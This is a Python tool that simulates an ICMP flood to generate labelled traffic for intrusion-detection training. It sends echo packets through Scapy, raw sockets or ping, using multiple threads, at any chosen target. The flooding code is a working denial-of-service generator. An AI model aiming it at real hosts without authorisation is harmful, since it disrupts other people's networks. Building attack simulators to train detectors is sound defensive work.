#!/usr/bin/env python3
# tools/attack_simulators/icmp_flood.py
# ─────────────────────────────────────────────────────────────────────────────
# ICMP Flood simulator for IDS training data collection.
#
# Uses Scapy if available (admin + Npcap), otherwise uses OS ping with
# aggressive flags to generate high ICMP rate.
#
# Usage:
#   python tools/attack_simulators/icmp_flood.py
#   python tools/attack_simulators/icmp_flood.py --target 192.168.1.1 --rate 100
#   python tools/attack_simulators/icmp_flood.py --duration 300
# ─────────────────────────────────────────────────────────────────────────────

import argparse
import random
import socket
import struct
import sys
import threading
import time
from datetime import datetime

DEFAULT_TARGET   = "127.0.0.1"
DEFAULT_RATE     = 80
DEFAULT_DURATION = 300


def _checksum(data: bytes) -> int:
    s = 0
    for i in range(0, len(data) - 1, 2):
        s += (data[i] << 8) + data[i + 1]
    if len(data) % 2:
        s += data[-1] << 8
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _make_icmp_echo(seq: int) -> bytes:
    payload = b"X" * 56
    header  = struct.pack("!BBHHH", 8, 0, 0, 1, seq)
    cksum   = _checksum(header + payload)
    return struct.pack("!BBHHH", 8, 0, cksum, 1, seq) + payload


def _raw_icmp_flood(target: str, rate: int, stop_event: threading.Event,
                    counters: dict):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        return False

    print("  [ICMP] Mode: raw ICMP socket")
    interval = 1.0 / rate
    seq = 0

    while not stop_event.is_set():
        pkt = _make_icmp_echo(seq % 65536)
        try:
            sock.sendto(pkt, (target, 0))
            counters["sent"] += 1
        except Exception:
            counters["errors"] += 1
        seq += 1
        time.sleep(interval)

    sock.close()
    return True


def _scapy_flood(target: str, rate: int, stop_event: threading.Event,
                 counters: dict):
    try:
        from scapy.all import IP, ICMP, send, conf
        conf.verb = 0
    except ImportError:
        return False

    print("  [ICMP] Mode: Scapy ICMP")
    interval = 1.0 / rate
    seq = 0

    while not stop_event.is_set():
        pkt = IP(dst=target) / ICMP(type=8, code=0, seq=seq % 65536)
        try:
            send(pkt, verbose=False)
            counters["sent"] += 1
        except Exception:
            counters["errors"] += 1
        seq += 1
        time.sleep(interval)

    return True


def _ping_flood_fallback(target: str, rate: int, stop_event: threading.Event,
                         counters: dict):
    """Multi-thread ping as fallback — generates real ICMP but lower rate."""
    import subprocess
    print("  [ICMP] Mode: ping subprocess (limited rate)")

    interval = 1.0 / max(rate, 1)

    while not stop_event.is_set():
        try:
            proc = subprocess.Popen(
                ["ping", "-n", "1", "-w", "50", target],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            proc.wait(timeout=0.5)
            counters["sent"] += 1
        except Exception:
            counters["errors"] += 1
        time.sleep(interval)


def _worker(target, rate, stop_event, counters, no_scapy=False):
    if not no_scapy and _scapy_flood(target, rate, stop_event, counters):
        return
    if _raw_icmp_flood(target, rate, stop_event, counters):
        return
    _ping_flood_fallback(target, rate, stop_event, counters)


def run(target: str, rate: int, duration: int, no_scapy: bool = False):
    print()
    print("=" * 60)
    print("  ICMP FLOOD SIMULATOR")
    print(f"  Target  : {target}")
    print(f"  Rate    : ~{rate} packets/s")
    print(f"  Duration: {duration}s")
    print(f"  Started : {datetime.now().strftime('%H:%M:%S')}")
    print("=" * 60)
    print()
    print("  Run simultaneously:")
    print(f"    python scripts/collect_traffic_windows.py \\")
    print(f"      --interface \"Wi-Fi\" --label \"ICMP Flood\" --duration {duration}")
    print()
    print("  Press Ctrl+C to stop early.")
    print()

    counters   = {"sent": 0, "errors": 0}
    stop_event = threading.Event()

    n_threads = max(1, rate // 30)
    threads = []
    for _ in range(n_threads):
        t = threading.Thread(
            target=_worker,
            args=(target, rate // n_threads, stop_event, counters, no_scapy),
            daemon=True,
        )
        t.start()
        threads.append(t)

    start = time.time()
    try:
        while True:
            elapsed   = time.time() - start
            remaining = duration - elapsed
            if remaining <= 0:
                break
            actual_rate = counters["sent"] / max(elapsed, 0.1)
            print(f"\r  Sent: {counters['sent']:>8}  Rate: {actual_rate:>7.1f} pkt/s  "
                  f"Remaining: {int(remaining):>4}s   ", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n\n  Stopped by user.")

    stop_event.set()
    for t in threads:
        t.join(timeout=2)

    elapsed = time.time() - start
    print(f"\n\n  Done. Sent {counters['sent']} packets in {elapsed:.1f}s "
          f"({counters['sent']/max(elapsed,0.1):.1f} pkt/s avg)")
    print()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ICMP Flood attack simulator")
    parser.add_argument("--target",   default=DEFAULT_TARGET)
    parser.add_argument("--rate",     type=int, default=DEFAULT_RATE,
                        help="Packets per second")
    parser.add_argument("--duration", type=int, default=DEFAULT_DURATION,
                        help="Duration in seconds")
    parser.add_argument("--no-scapy", action="store_true",
                        help="Skip Scapy and use raw socket or ping fallback directly")
    args = parser.parse_args()
    run(args.target, args.rate, args.duration, no_scapy=args.no_scapy)
